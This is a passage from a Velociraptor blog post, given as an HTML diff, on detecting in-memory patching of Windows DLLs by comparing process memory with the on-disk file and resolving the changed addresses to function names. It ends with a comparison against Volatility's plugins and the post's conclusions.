+<p>Therefore we need to calculate the relative address of the hit, and
+then look up the export table quickly to resolve the nearest function.</p>
+<p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/calculating_hit_rva_.svg" alt="Calculating the Relative Virtual Address of the memory
+hit"
+         class="inline"
+         height="1103.3333333333335"
+         width="1596.6666666666665"  />
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="calculating_hit_rva.svg"><i class="fa fa-download"></i></a>
+    Calculating the Relative Virtual Address of the memory
+hit
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>This is shown diagrammatically above. The different offset (within the
+mapped segment) is converted to an RVA by adding the <code>.text</code> section&rsquo;s
+RVA offset, then we can look up the name of the function from the
+export table using the <a href="/vql_reference/other/describe_address/">describe_address()</a> function.</p>
+<p>We modify our comparison function to accept the <code>TextSegment</code> and
+return the name of the exported function:</p>
+<pre><code class="language-vql">LET Compare(MemoryData, DiskData, TextSegment, Dll) = SELECT
+    _value AS Offset,
+    TextSegment.RVA + _value AS RVA,
+    describe_address(module=Dll, rva=TextSegment.RVA + _value).func AS Func,
+    MemoryData[_value:(_value + 8)] AS MemoryInt,
+    DiskData[_value:(_value + 8)] AS DiskInt
+  FROM range(end=len(list=MemoryData), step=8)
+  WHERE MemoryInt != DiskInt
+</code></pre>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/resolving_addresses.png"
+         class="inline"
+         alt="Resolving the patched memory back to a function name"
+         width="1581" height="273">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="resolving_addresses.png">
+      <i class="fa fa-download"></i></a>
+    Resolving the patched memory back to a function name
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>Now it is very obvious what this patch aims to achieve!</p>
+<h2 id="step-8-handling-relocations">Step 8: Handling relocations</h2>
+<p>The above example was very simplified. If we tested this over more
+binaries we would discover that there are many memory locations which
+are different from disk due to PE relocations. These are special
+addresses in the binary code which require &ldquo;fixing up&rdquo; when the binary
+is moved from its preferred base address.</p>
+<p>With the use of 64 bit code, the number of relocations is much
+smaller, although 64 bit code can sometimes have relocations
+too. However, in 32 bit code relocations are very common.</p>
+<p>When an address is patched by the loaded due to relocations, the value
+in that address is increased by the ASLR offset. This means the
+integers stored at that address on disk and memory have a constant
+difference.</p>
+<p>More complex VQL can deal with these and exclude expected differences
+due to relocations.</p>
+<p>We will not describe this more complex code in this blog post, and
+simply refer the reader to the full <a href="/exchange/artifacts/pages/windows.memory.mem2disk/">Windows.Memory.Mem2Disk</a> artifact,
+written by Lautaro Lecumberry and Dr. Michael Denzel.</p>
+<p>This artifact is also optimized for performance and has many useful
+filters to restrict scanning to those dlls commonly targeted by
+malware. The artifact is also multi-threaded which makes scanning
+multiple processes in parallel possible.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/Windows.Memory.Mem2Disk.png"
+         class="inline"
+         alt="Output from the Windows.Memory.Mem2Disk artifact"
+         width="1541" height="582">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="Windows.Memory.Mem2Disk.png">
+      <i class="fa fa-download"></i></a>
+    Output from the Windows.Memory.Mem2Disk artifact
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>The artifact also allows uploading the different memory regions for
+further inspection.</p>
+<p>On my system the <code>Windows.Memory.Mem2Disk</code> artifact completes a full
+scan of all running processes in under 2 seconds.</p>
+<h1 id="discussion">Discussion</h1>
+<p>In this post we saw how some of the memory analysis tools available in
+Velociraptor can be combined to write some very sophisticated
+detections for memory patching attacks.</p>
+<p>Let&rsquo;s compare those memory analysis primitives we explored in this
+article, with Volatility&rsquo;s plugins:</p>
+<ol>
+<li>
+<p>The <code>pslist</code> plugin is similar - Velociraptor&rsquo;s plugin returns
+similar results to Volatility&rsquo;s <code>pslist</code> plugin, except that
+Velociraptor&rsquo;s plugin uses the APIs, making it much faster and
+absolutely reliable. Volatility&rsquo;s <code>pslist</code> plugin parses internal
+kernel structures, depends on memory profiles which can be fragile
+and is susceptible to memory smear (e.g. process linked list may be
+broken due to smear causing many processes to be missed).</p>
+</li>
+<li>
+<p>Velociraptor&rsquo;s <code>vad()</code> plugin is very similar to Volatility&rsquo;s <code>vad</code>
+plugin, but uses the APIs to obtain its data, hence the results are
+coherent and reliable.</p>
+</li>
+<li>
+<p>When converting from kernel paths to filesystem paths, we used
+Velociraptor&rsquo;s <code>winobj</code> plugin which is similar to Volatility&rsquo;s
+<code>winobj</code> plugin.</p>
+</li>
+<li>
+<p>Parsing the Dll from disk we used Velociraptor&rsquo;s powerful
+<code>parse_pe()</code> plugin which gives a lot of details about the PE file,
+including sections, exports etc.</p>
+</li>
+<li>
+<p>When reading process memory, we used <code>read_file()</code> with the process
+accessor. Volatility has similar internal facilities to reconstruct
+the process virtual address space from the physical memory
+image. However, this capability is limited because much of the PE
+mapped section is not memory resident into physical memory. Windows
+maps the DLL lazily such that data is read from disk only when
+needed. This typically means that dumping process memory from
+Volatility is unreliable as it is missing large chunks of the
+binary.</p>
+<p>To be fair, if the binary is patched in memory, then the page will
+be allocated (using copy-on-write semantics) and it is likely to be
+resident. So Volatility is likely to still find all the patched
+pages in physical memory.</p>
+</li>
+<li>
+<p>Resolving function names we used the <code>describe_address()</code> plugin,
+which caches much of the data, so it is very fast to resolve many
+addresses.</p>
+</li>
+</ol>
+<p>Velociraptor&rsquo;s memory analysis does not require a memory image, and
+yields better results. It is typically much faster and can be deployed
+at scale over a large number of endpoints. Since the logic is written
+in VQL, we can tweak and improve the query over time without needing
+to deploy new binaries or endpoints.</p>
+<p>Velociraptor&rsquo;s VQL language is fast and multithreaded, allowing very
+fast scanning. If needed, Velociraptor&rsquo;s queries can be CPU limited
+too so we can balance speed over endpoint resource usage.</p>
+<p>So is it always better to use Velociraptor&rsquo;s memory analysis? Not
+always. The main disadvantage with Velociraptor&rsquo;s approach is that
+data is obtained from standard API calls. This means that the
+operating system can enforce security restrictions on the data
+Velociraptor can access.</p>
+<p>It is quite normal for Velociraptor to be unable to read some process
+memory - either due to a security product preventing this operation,
+or because the target process is protected by the operating system
+(e.g. <a href="https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-" target="_blank" >Protected Process Light
+(PPL)</a>). In
+this case we will see messages such as <code>vad: OpenProcess for pid 1004 (csrss.exe) : Access is denied.</code> limiting our access to some processes.</p>
+<p>Does it matter? It depends. If the malware has a higher level of access
+than Velociraptor (e.g. if it is running in kernel mode, or is signed
+as a PPL process) then it might be able to hide in those protected
+processes that Velociraptor cannot access.</p>
+<p>But then again, if the malware has such privilege it can easily stop a
+driver from loading to prevent physical memory acquisition as well -
+it becomes an arms race.</p>
+<h1 id="conclusions">Conclusions</h1>
+<p>When analysts think of developing a new memory analysis technique,
+they often immediately go to a physical memory image with a framework
+like Volatility. I hope you have seen that this is not necessary and that
+Velociraptor&rsquo;s VQL actually makes things much easier to develop and
+can produce more reliable results.</p>
+<p>Velociraptor&rsquo;s binary parser is also very powerful (it was inspired
+from Volatility&rsquo;s internal parser) so you have similar tools for
+parsing complex binary structures as those that Volatility provides.</p>
+<p>If you like to try the new <code>Windows.Memory.Mem2Disk</code> artifact, take
+Velociraptor for a spin !  It is available on GitHub under an open
+source license. As always please file issues on the bug tracker or ask
+questions on our mailing list <code>velociraptor-discuss@googlegroups.com</code>
+. You can also chat with us directly on discord
+<a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord</a> .</p>
+
+
+
+
+
+<footer class=" footline" >
+	
+</footer>
+
+        
+        </div>
+        
+
+      </div>
+
+    </section>
+
+    <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
+      <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
+    </div>
+    <script src="/js/clipboard.min.js?1775352328"></script>
+    <script src="/js/perfect-scrollbar.min.js?1775352328"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1775352328"></script>
+    <script src="/js/jquery.sticky.js?1775352328"></script>
+    <script src="/js/featherlight.min.js?1775352328"></script>
+    <script src="/js/highlight.min.js?1775352328"></script>
+    <script>
+      hljs.highlightAll();
+    </script>
+
+    <script src="/js/modernizr.custom-3.6.0.js?1775352328"></script>
+    <script src="/js/learn.js?1775352328"></script>
+    <script src="/js/hugo-learn.js?1775352328"></script>
+    
+    
+
+  </body>
+</html>
